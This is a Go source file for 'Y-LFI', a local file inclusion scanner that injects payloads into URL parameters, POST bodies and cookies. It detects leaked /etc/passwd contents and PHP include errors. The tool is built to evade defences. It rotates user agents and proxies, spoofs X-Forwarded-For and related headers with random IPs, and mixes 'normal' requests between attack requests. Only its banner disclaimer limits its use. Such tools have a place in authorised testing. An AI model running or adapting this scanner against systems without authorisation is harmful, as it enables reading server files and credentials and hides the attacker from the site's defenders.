package main

import (
    "bufio"
    "bytes"
    "context"
    "crypto/tls"
    "encoding/json"
    "flag"
    "fmt"
    "io"
    "math/rand"
    "net/http"
    "net/url"
    "os"
    "regexp"
    "strings"
    "sync"
    "time"

    "golang.org/x/time/rate"
)

// ANSI color codes
const (
    Red    = "\033[31m"
    White  = "\033[37m"
    Reset  = "\033[0m"
    Yellow = "\033[33m"
    Green  = "\033[32m"
)

// LFI indicators to check in responses
var lfiIndicators = []string{
    "/etc/passwd", // Focus on specific file paths
}

const (
    maxRetries       = 3
    minResponseSize  = 50 // Minimum response size to consider valid
    passwdRegex      = `^[^:]+:[^:]+:[0-9]+:[0-9]+:[^:]+:[^:]+:[^:]+$` // Regex for /etc/passwd line
    rateLimitPerSec  = 5  // Max requests per second
)

var (
    proxies      []string
    proxyIndex   int
    proxyMutex   sync.Mutex
    resultFile   *os.File
    resultMutex  sync.Mutex
    limiter      = rate.NewLimiter(rate.Limit(rateLimitPerSec), 1) // Rate limiter
)

// Expanded User-Agents list
var userAgents = []string{
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (Android 10; Mobile; rv:68.0) Gecko/68.0 Firefox/68.0",
    "Mozilla/5.0 (Linux; Android 11; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.77 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko",
}

func main() {
    // Print banner
    fmt.Println(White + `
__     __     _      ______ _____
\ \   / /    | |    |  ____|_   _|
 \ \_/ /_____| |    | |__    | |
  \   /______| |    |  __|   | |
   | |       | |____| |     _| |_
   |_|       |______|_|    |_____|
    
` + Reset)
    fmt.Println(Red + `        -/|\    Y-LFI    -/|\` + Reset)
    fmt.Println(White + `           Created by Ahmex000` + Reset)

    // Legal disclaimer
    fmt.Println(Yellow + `
[!] Legal disclaimer: Usage of Y-LFI for attacking targets without prior mutual consent
is illegal. It is the end user's responsibility to obey all applicable local, state 
and federal laws. Developers assume no liability and are not responsible for any 
misuse or damage caused by this program.` + Reset)

    payloadFile := flag.String("p", "", "Path to payload file")
    urlFlag := flag.String("u", "", "Single URL or request file for POST")
    endpointFile := flag.String("f", "", "File containing endpoints")
    threads := flag.Int("t", 10, "Number of concurrent threads")
    method := flag.String("m", "GET", "HTTP method (GET or POST)")
    reqInterval := flag.Int("r", 10, "Send normal request after this many requests")
    proxy := flag.String("proxy", "", "Single proxy (e.g., http://proxy.example.com:8080)")
    proxyFile := flag.String("proxyfile", "", "File containing proxy list")
    outputFile := flag.String("o", "", "Output file for results (e.g., results.txt)")
    rateLimit := flag.Int("rate", rateLimitPerSec, "Max requests per second")
    headers := flag.String("headers", "", "Custom headers (e.g., 'Header1:Value1,Header2:Value2')")
    cookies := flag.String("cookies", "", "Custom cookies (e.g., 'Cookie1=Value1; Cookie2=Value2')")
    timeout := flag.Int("timeout", 10, "Request timeout in seconds")
    skipSSLVerify := flag.Bool("skip-ssl-verify", false, "Skip SSL/TLS certificate verification")
    flag.Parse()

    limiter.SetLimit(rate.Limit(*rateLimit)) // Update rate limit from flag

    if *payloadFile == "" || (*urlFlag == "" && *endpointFile == "") {
        fmt.Println("Usage: go run YLfi.go -p payloads.txt [-u url/request_file | -f endpoints.txt] [-t threads] [-m GET|POST] [-r interval] [-proxy proxy | -proxyfile proxies_file] [-o output_file] [-rate requests_per_sec] [-headers 'Header1:Value1,Header2:Value2'] [-cookies 'Cookie1=Value1; Cookie2=Value2'] [-timeout 10] [-skip-ssl-verify]")
        os.Exit(1)
    }

    // Initialize output file if specified
    if *outputFile != "" {
        var err error
        resultFile, err = os.Create(*outputFile)
        if err != nil {
            fmt.Printf("%sError creating output file %s: %v%s\n", Red, *outputFile, err, Reset)
            os.Exit(1)
        }
        defer resultFile.Close()
    }

    // Load proxies
    if *proxy != "" {
        proxies = append(proxies, *proxy)
    } else if *proxyFile != "" {
        var err error
        proxies, err = readLines(*proxyFile)
        if err != nil {
            fmt.Printf("%sError reading proxy file: %v%s\n", Red, err, Reset)
            os.Exit(1)
        }
    }

    // Validate proxies
    if len(proxies) > 0 {
        validateProxies()
    }

    payloads, err := readLines(*payloadFile)
    if err != nil {
        fmt.Printf("%sError reading payloads file: %v%s\n", Red, err, Reset)
        os.Exit(1)
    }

    var endpoints []string
    if *urlFlag != "" {
        if *method == "POST" {
            requests, err := readLines(*urlFlag)
            if err != nil {
                fmt.Printf("%sError reading request file: %v%s\n", Red, err, Reset)
                os.Exit(1)
            }
            endpoints = requests
        } else {
            endpoints = append(endpoints, *urlFlag)
        }
    } else {
        endpoints, err = readLines(*endpointFile)
        if err != nil {
            fmt.Printf("%sError reading endpoints file: %v%s\n", Red, err, Reset)
            os.Exit(1)
        }
    }

    urlChan := make(chan string, 1000)
    var wg sync.WaitGroup
    requestCount := 0
    var countMutex sync.Mutex

    for i := 0; i < *threads; i++ {
        wg.Add(1)
        go worker(urlChan, payloads, *method, *reqInterval, &requestCount, &countMutex, &wg, *headers, *cookies, *timeout, *skipSSLVerify)
    }

    for _, endpoint := range endpoints {
        if *method == "POST" {
            urlChan <- endpoint
        } else {
            params := extractParams(endpoint)
            for param := range params {
                for _, payload := range payloads {
                    urlChan <- buildURLWithParam(endpoint, param, payload)
                }
            }
        }
    }
    close(urlChan)
    wg.Wait()
}

func worker(urlChan <-chan string, payloads []string, method string, reqInterval int, requestCount *int, countMutex *sync.Mutex, wg *sync.WaitGroup, headers string, cookies string, timeout int, skipSSLVerify bool) {
    defer wg.Done()

    testedEndpoints := make(map[string]bool)
    rand.Seed(time.Now().UnixNano())

    for fullURL := range urlChan {
        if err := limiter.Wait(context.Background()); err != nil {
            fmt.Printf("%s[-] Rate limit error for %s: %v%s\n", Red, fullURL, err, Reset)
            continue
        }

        baseEndpoint := extractBaseEndpoint(fullURL, payloads)
        if testedEndpoints[baseEndpoint] {
            continue
        }

        client := createClient(timeout, skipSSLVerify)
        req, err := buildRequest(method, fullURL, payloads, headers, cookies)
        if err != nil {
            fmt.Printf("%s[-] Error building request for %s: %v%s\n", Red, fullURL, err, Reset)
            logResult(fmt.Sprintf("[-] Error building request for %s: %v", fullURL, err))
            continue
        }

        if performRequestWithRetry(client, req, fullURL) {
            countMutex.Lock()
            *requestCount++
            if *requestCount%reqInterval == 0 {
                sendNormalRequest(client, baseEndpoint)
            }
            countMutex.Unlock()

            if method == "POST" {
                testCookies(fullURL, payloads, client, testedEndpoints)
            }
        }
    }
}

func createClient(timeout int, skipSSLVerify bool) *http.Client {
    transport := &http.Transport{
        ForceAttemptHTTP2: false,
        TLSClientConfig: &tls.Config{
            InsecureSkipVerify: skipSSLVerify,
        },
    }
    if len(proxies) > 0 {
        // Round-Robin proxy selection with mutex for thread safety
        proxyURL, _ := url.Parse(getNextProxy())
        transport.Proxy = http.ProxyURL(proxyURL)
    }
    return &http.Client{
        Timeout:   time.Duration(timeout) * time.Second,
        Transport: transport,
    }
}

func getNextProxy() string {
    proxyMutex.Lock()
    defer proxyMutex.Unlock()
    if len(proxies) == 0 {
        return ""
    }
    proxy := proxies[proxyIndex]
    proxyIndex = (proxyIndex + 1) % len(proxies)
    return proxy
}

func buildRequest(method, fullURL string, payloads []string, headers string, cookies string) (*http.Request, error) {
    var req *http.Request
    var err error

    if method == "GET" {
        req, err = http.NewRequest("GET", fullURL, nil)
    } else if method == "POST" {
        parts := strings.SplitN(fullURL, " ", 2)
        if len(parts) < 2 {
            return nil, fmt.Errorf("invalid POST request format")
        }
        urlPart := parts[0]
        bodyPart := parts[1]

        req, err = http.NewRequest("POST", urlPart, bytes.NewBufferString(bodyPart))
        if err != nil {
            return nil, err
        }
        if strings.Contains(bodyPart, "{") && strings.Contains(bodyPart, "}") {
            req.Header.Set("Content-Type", "application/json")
        } else {
            req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
        }
    } else {
        return nil, fmt.Errorf("unsupported method: %s", method)
    }

    if err != nil {
        return nil, err
    }

    // Add custom headers
    if headers != "" {
        headerPairs := strings.Split(headers, ",")
        for _, pair := range headerPairs {
            parts := strings.SplitN(pair, ":", 2)
            if len(parts) == 2 {
                req.Header.Set(strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1]))
            }
        }
    }

    // Add custom cookies
    if cookies != "" {
        req.Header.Set("Cookie", cookies)
    }

    // Add realistic headers with random IPs
    req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
    req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
    req.Header.Set("Accept-Language", "en-US,en;q=0.5")
    req.Header.Set("Connection", "keep-alive")
    req.Header.Set("Upgrade-Insecure-Requests", "1")
    req.Header.Set("X-Forwarded-For", randomIP())
    req.Header.Set("Forwarded", "for="+randomIP())
    req.Header.Set("X-Real-IP", randomIP())
    return req, nil
}

func validateProxies() {
    var validProxies []string
    for _, proxy := range proxies {
        client := &http.Client{
            Timeout: 5 * time.Second,
            Transport: &http.Transport{
                Proxy: http.ProxyURL(&url.URL{Scheme: "http", Host: proxy}),
            },
        }
        resp, err := client.Get("http://example.com")
        if err == nil && resp.StatusCode == http.StatusOK {
            validProxies = append(validProxies, proxy)
        }
    }
    proxies = validProxies
}

func readLines(filename string) ([]string, error) {
    file, err := os.Open(filename)
    if err != nil {
        return nil, err
    }
    defer file.Close()

    var lines []string
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        line := strings.TrimSpace(scanner.Text())
        if line != "" {
            lines = append(lines, line)
        }
    }
    return lines, scanner.Err()
}

func extractParams(endpoint string) map[string][]string {
    parsedURL, err := url.Parse(endpoint)
    if err != nil {
        return map[string][]string{}
    }
    return parsedURL.Query()
}

func buildURLWithParam(endpoint, param, payload string) string {
    parsedURL, _ := url.Parse(endpoint)
    query := parsedURL.Query()
    query.Set(param, payload)
    parsedURL.RawQuery = query.Encode()
    return parsedURL.String()
}

func extractBaseEndpoint(url string, payloads []string) string {
    for _, payload := range payloads {
        if strings.HasSuffix(url, payload) {
            return strings.TrimSuffix(url, payload)
        }
    }
    return url
}

func logResult(message string) {
    if resultFile != nil {
        resultMutex.Lock()
        defer resultMutex.Unlock()
        fmt.Fprintf(resultFile, "%s\n", message)
    }
}

func performRequestWithRetry(client *http.Client, req *http.Request, fullURL string) bool {
    startTime := time.Now()
    for attempt := 1; attempt <= maxRetries; attempt++ {
        resp, err := client.Do(req)
        if err == nil {
            defer resp.Body.Close()

            // Use bufio for memory-efficient reading
            reader := bufio.NewReader(resp.Body)
            var bodyBuilder strings.Builder
            for {
                line, err := reader.ReadString('\n')
                if err == io.EOF {
                    break
                }
                if err != nil {
                    fmt.Printf("%s[-] Error reading response line from %s (attempt %d): %v%s\n", Red, fullURL, attempt, err, Reset)
                    logResult(fmt.Sprintf("[-] Error reading response line from %s (attempt %d): %v", fullURL, attempt, err))
                    return false
                }
                bodyBuilder.WriteString(line)
            }
            body := bodyBuilder.String()

            responseTime := time.Since(startTime).Milliseconds()
            logResult(fmt.Sprintf("Response time for %s: %dms", fullURL, responseTime))

            // Check response size
            if len(body) < minResponseSize {
                logResult(fmt.Sprintf("[!] Warning: Response too small (<50 bytes) for %s - Possible WAF block or error", fullURL))
                fmt.Printf("%s[!] Warning: Response too small (<50 bytes) for %s (Response time: %dms) - Possible WAF block or error%s\n", Yellow, fullURL, responseTime, Reset)
                return false
            }

            // Check for LFI indicators using regex for /etc/passwd
            lfiFound := false
            passwdRe := regexp.MustCompile(passwdRegex)
            if strings.Contains(body, "/etc/passwd") {
                lines := strings.Split(body, "\n")
                for _, line := range lines {
                    if passwdRe.MatchString(strings.TrimSpace(line)) {
                        fmt.Printf("%s[+] Potential LFI found: %s (Response time: %dms)%s\n", Green, fullURL, responseTime, Reset)
                        fmt.Printf("%s    Indicator: /etc/passwd (Valid passwd structure detected)%s\n", Green, Reset)
                        logResult(fmt.Sprintf("[+] Potential LFI found: %s (Response time: %dms) - Indicator: /etc/passwd (Valid passwd structure detected)", fullURL, responseTime))
                        lfiFound = true
                        break
                    }
                }
            }

            // Check for PHP errors or WAF patterns
            if strings.Contains(body, "Warning: include(") || strings.Contains(body, "failed to open stream") {
                logResult(fmt.Sprintf("[!] Warning: Possible PHP error or WAF block detected in %s (Response time: %dms) - Check response", fullURL, responseTime))
                fmt.Printf("%s[!] Warning: Possible PHP error or WAF block detected in %s (Response time: %dms) - Check response%s\n", Yellow, fullURL, responseTime, Reset)
            }

            // Check for JSON response
            if strings.HasPrefix(http.DetectContentType([]byte(body)), "application/json") {
                var jsonData map[string]interface{}
                if err := json.Unmarshal([]byte(body), &jsonData); err == nil {
                    if msg, ok := jsonData["message"].(string); ok {
                        if strings.Contains(strings.ToLower(msg), "error") || strings.Contains(strings.ToLower(msg), "blocked") {
                            logResult(fmt.Sprintf("[!] Warning: JSON response indicates error or block in %s (Response time: %dms) - Message: %s", fullURL, responseTime, msg))
                            fmt.Printf("%s[!] Warning: JSON response indicates error or block in %s (Response time: %dms) - Message: %s%s\n", Yellow, fullURL, responseTime, msg, Reset)
                        }
                    }
                }
            }

            return lfiFound
        }

        // Exponential backoff
        backoff := time.Duration(1<<uint(attempt-1)) * time.Second // 1s, 2s, 4s
        logResult(fmt.Sprintf("[-] Error on %s (attempt %d): %v - Retrying in %v", fullURL, attempt, err, backoff))
        fmt.Printf("%s[-] Error on %s (attempt %d): %v - Retrying in %v%s\n", Red, fullURL, attempt, err, backoff, Reset)
        time.Sleep(backoff)
    }
    logResult(fmt.Sprintf("[-] Failed after %d attempts for %s", maxRetries, fullURL))
    fmt.Printf("%s[-] Failed after %d attempts for %s%s\n", Red, maxRetries, fullURL, Reset)
    return false
}

func sendNormalRequest(client *http.Client, baseURL string) {
    req, err := http.NewRequest("GET", baseURL, nil)
    if err != nil {
        return
    }
    req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
    req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
    resp, err := client.Do(req)
    if err != nil {
        fmt.Printf("%s[-] Error sending normal request to %s: %v%s\n", Red, baseURL, err, Reset)
        return
    }
    resp.Body.Close()
}

func testCookies(fullURL string, payloads []string, client *http.Client, testedEndpoints map[string]bool) {
    parts := strings.SplitN(fullURL, " ", 2)
    if len(parts) < 1 {
        return
    }
    baseURL := parts[0]

    for _, payload := range payloads {
        req, err := http.NewRequest("POST", baseURL, nil)
        if err != nil {
            continue
        }

        req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
        req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
        req.Header.Set("Cookie", "test="+payload)
        req.Header.Set("X-Forwarded-For", randomIP())

        if performRequestWithRetry(client, req, fullURL) {
            testedEndpoints[baseURL] = true
        }
    }
}

func randomIP() string {
    return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))
}
